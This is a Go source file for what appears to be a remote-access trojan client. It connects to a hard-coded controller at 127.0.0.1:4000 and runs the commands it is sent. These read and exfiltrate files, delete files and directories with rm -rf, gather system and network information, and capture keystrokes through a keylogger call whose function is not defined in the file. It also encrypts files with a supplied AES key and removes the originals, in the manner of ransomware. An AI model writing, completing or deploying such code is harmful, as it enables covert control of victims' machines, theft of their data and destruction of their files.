package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"io/ioutil"
	random "math/rand"
	"net"
	"os"
	"os/exec"
	"strconv"
	"strings"
	"time"
)

const (
	IP   = "127.0.0.1"
	PORT = "4000"
)

var (
	buffer    = make([]byte, 1024)
	directory string
	message   string
)

func main() {
	conn, err := net.Dial("tcp", IP+":"+PORT)
	if err != nil {
		os.Exit(1)
	}

	for {
		length, err := conn.Read(buffer)
		if err != nil {
			os.Exit(1)
		}
		message = string(buffer[:length])

		if strings.HasPrefix(message, "ls") {
			comm := ls_comm(message)
			conn.Write([]byte(comm))
		}

		if strings.HasPrefix(message, "dirm") {
			exec.Command("rm", "-rf", message[5:]).Output()
			conn.Write([]byte("delete - ok"))
		}

		if strings.HasPrefix(message, "rm") {
			exec.Command("rm", message[3:]).Output()
			conn.Write([]byte("delete - ok"))
		}

		if strings.HasPrefix(message, "file") {
			data, err := ioutil.ReadFile(message[5:])
			if err != nil {
				conn.Write([]byte("error read file"))
			}
			conn.Write([]byte(string(data)))
		}

		if strings.HasPrefix(message, "upfile") {
			data := []byte(string(message[7:]))
			random.Seed(time.Now().UnixNano())
			number := random.Intn(10000)
			err := ioutil.WriteFile(string(number)+"write.txt", data, 0777)
			if err != nil {
				conn.Write([]byte("file not written"))
			} else {
				conn.Write([]byte("file was recorded"))
			}
		}

		if strings.HasPrefix(message, "crypt") {
			data := strings.Split(message, " ")
			password := data[1]
			path := data[2]
			file_name := strings.Split(path, "/")
			res := CryptFile(file_name[len(file_name)-1], path, password)
			conn.Write([]byte(res))
		}

		if strings.HasPrefix(message, "keylogger") {
			data := strings.Split(message, " ")
			length, err := strconv.Atoi(data[1])
			if err != nil {
				conn.Write([]byte("wrong quantity entered"))
			} else {
				logs := keyLogger(length)
				conn.Write([]byte(logs))
			}
		}

		if message == "sysinfo" {
			comm0 := command("systeminfo")
			conn.Write([]byte(comm0))
		}

		if message == "pwd" {
			comm := command("pwd")
			conn.Write([]byte(comm))
		}

		if message == "ifconfig" {
			comm1 := command("ipconfig")
			conn.Write([]byte(comm1))
		}

		if strings.HasPrefix(message, "close") {
			conn.Close()
			os.Exit(1)
		}
	}
}

func CryptFile(name, path, password string) string {
	file, _ := ioutil.ReadFile(path)
	text := []byte(file)
	key := []byte(password)
	exec.Command("rm", path).Output()
	cr, err := aes.NewCipher(key)
	if err != nil {
		return "error new cipher"
	}
	fmt.Println(err)
	gcm, err := cipher.NewGCM(cr)
	if err != nil {
		return "error new GCM"
	}
	nonce := make([]byte, gcm.NonceSize())
	_, err = io.ReadFull(rand.Reader, nonce)
	if err != nil {
		return "error ReadFull"
	}
	err = ioutil.WriteFile(path+".hui", gcm.Seal(nonce, nonce, text, nil), 0777)
	if err != nil {
		return "error Write"
	}
	return "crypt " + name + " sucessful"
}

/*
func DecryptFile(name, path, password  string) string {
	ciphertext, err := ioutil.ReadFile(path)
	if err != nil { return "error ReadFile" }
	key := []byte(password)

	cr, err := aes.NewCipher(key)
	if err != nil { return "error new cipher" }
	gcm, err := cipher.NewGCM(cr)
	if err != nil { return "error new GCM" }
	nonceSize := gcm.NonceSize()
	if len(ciphertext) < nonceSize { return "error NonceSize" }
	nonce, ciphertext := ciphertext[:nonceSize], ciphertext[nonceSize:]
	plaintext, err := gcm.Open(nil, nonce, ciphertext, nil)
	if err != nil { return "error GCM" }
	data, err := ioutil.WriteFile(path, string(plaintext), 0777)
	if err != nil { return "error Write File" }

	return "decrypt " + name + " sucessful"
} */

func ls_comm(text string) string {
	if len(text) > 2 {
		cmd, _ := exec.Command("ls", text[3:]).Output()
		return string(cmd)
	} else {
		cmd, _ := exec.Command("ls").Output()
		return string(cmd)
	}
}

func command(text string) string {
	cmd, _ := exec.Command(text).Output()
	return string(cmd)
}
